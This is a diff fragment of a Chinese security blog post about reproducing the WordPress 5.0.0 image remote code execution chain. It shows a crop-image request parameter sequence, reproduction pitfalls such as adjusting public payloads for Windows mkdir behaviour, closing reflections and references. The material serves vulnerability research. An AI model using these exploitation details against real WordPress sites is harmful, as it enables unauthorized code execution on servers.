 <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">action=image-editor&amp;_ajax_nonce=d6b0263153&amp;postid=4&amp;history=%5B%7B%22c%22%3A%7B%22x%22%3A86%2C%22y%22%3A61%2C%22w%22%3A227%2C%22h%22%3A110%7D%7D%5D&amp;target=all&amp;context=edit-attachment&amp;do=save</div><div class="line"></div><div class="line">-&gt;</div><div class="line"></div><div class="line">action=crop-image&amp;_ajax_nonce=d6b0263153&amp;id=4&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</div></pre></td></tr></table></figure>
-<h2 id="遇到的坑">遇到的坑</h2>
-<h3 id="自动更新">自动更新</h3>
-<p>wp会自动更新小版本，需要在wp-config.php添加<code>define('AUTOMATIC_UPDATER_DISABLED',true);</code></p>
-<h3 id="mkdir">mkdir</h3>
-<p>windows环境下，文件夹中不能出现<code>?</code>号，此时，使用php内置函数mkdir就无法执行成功；网上的payload不能直接用；需要将<code>?</code>改为<code>#</code>。</p>
-<h3 id="id参数名变更">id参数名变更</h3>
-<p>使用crop-image时，postid改为id。</p>
-<h3 id="template覆盖">template覆盖</h3>
-<ul>
+<h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><h3 id="自动更新"><a href="#自动更新" class="headerlink" title="自动更新"></a>自动更新</h3><p>wp会自动更新小版本，需要在wp-config.php添加<code>define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);</code></p>
+<h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><p>windows环境下，文件夹中不能出现<code>?</code>号，此时，使用php内置函数mkdir就无法执行成功；网上的payload不能直接用；需要将<code>?</code>改为<code>#</code>。</p>
+<h3 id="id参数名变更"><a href="#id参数名变更" class="headerlink" title="id参数名变更"></a>id参数名变更</h3><p>使用crop-image时，postid改为id。</p>
+<h3 id="template覆盖"><a href="#template覆盖" class="headerlink" title="template覆盖"></a>template覆盖</h3><ul>
 <li>如果设置了这个值，但这个文件不存在，则会被定义为default。</li>
 <li>如果该值被设置，则没办法通过这种方式修改。</li>
 <li>所以要写模板的路径必须新上传一个媒体文件</li>
 </ul>
-<h2 id="写在最后">写在最后</h2>
-<p>整个利用链涉及到的模块很多，也涉及到了不同操作系统的某些特性。漏洞的逻辑较为复杂，自己花了比较长的时间，也学到很多东西。</p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>整个利用链涉及到的模块很多，也涉及到了不同操作系统的某些特性。漏洞的逻辑较为复杂，自己花了比较长的时间，也学到很多东西。</p>
 <ul>
 <li>就这个漏洞而言，WP直接留下的媒体文件信息更新接口在前端上并没有直接的反应，不知道更新文件路径、裁剪图片和文件模板的接口直接暴露在外是怎样的想法。也许是功能未实现的遗留，也许是计划要实现的功能，为什么出现这些函数也不得而知。需要对WP整个执行流程甚至源码开发本身有比较深入的理解才能知道其中产生的原因。</li>
 <li>就不同操作系统而言，mkdir函数的变现直接影响到了利用过程，在不同系统、不同php版本下都有很多不一样的细节。在<a href="https://paper.seebug.org/863/" target="_blank" rel="external">天融信阿尔法实验室的文章</a>中有较为详细的底层探究知识，自己在这块还比较薄弱，需要进一步学习。</li>
 </ul>
-<h2 id="参考资料">参考资料</h2>
-<ul>
-<li>https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</li>
-<li>https://paper.seebug.org/863/</li>
-<li>https://zeroyu.xyz/2019/03/06/wordpress-5-0-0-rce-aanalysis/</li>
-<li>http://blog.nsfocus.net/wordpress-5-0-0-rce/</li>
-<li>https://lorexxar.cn/2019/02/22/wordpress-core-rce/</li>
-<li>https://paper.seebug.org/825/</li>
-<li>http://yulige.top/?p=578</li>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/" target="_blank" rel="external">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</a></li>
+<li><a href="https://paper.seebug.org/863/" target="_blank" rel="external">https://paper.seebug.org/863/</a></li>
+<li><a href="https://zeroyu.xyz/2019/03/06/wordpress-5-0-0-rce-aanalysis/" target="_blank" rel="external">https://zeroyu.xyz/2019/03/06/wordpress-5-0-0-rce-aanalysis/</a></li>
+<li><a href="http://blog.nsfocus.net/wordpress-5-0-0-rce/" target="_blank" rel="external">http://blog.nsfocus.net/wordpress-5-0-0-rce/</a></li>
+<li><a href="https://lorexxar.cn/2019/02/22/wordpress-core-rce/" target="_blank" rel="external">https://lorexxar.cn/2019/02/22/wordpress-core-rce/</a></li>
+<li><a href="https://paper.seebug.org/825/" target="_blank" rel="external">https://paper.seebug.org/825/</a></li>
+<li><a href="http://yulige.top/?p=578" target="_blank" rel="external">http://yulige.top/?p=578</a></li>
 </ul>
 
         
@@ -657,10 +600,6 @@ window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMin
                 
                     <li>
                         <a href="https://jygzyc.github.io">jygzyc</a>
-                    </li>
-                
-                    <li>
-                        <a href="http://grootsec.org">grootsec</a>
                     </li>
                 
             </ul>
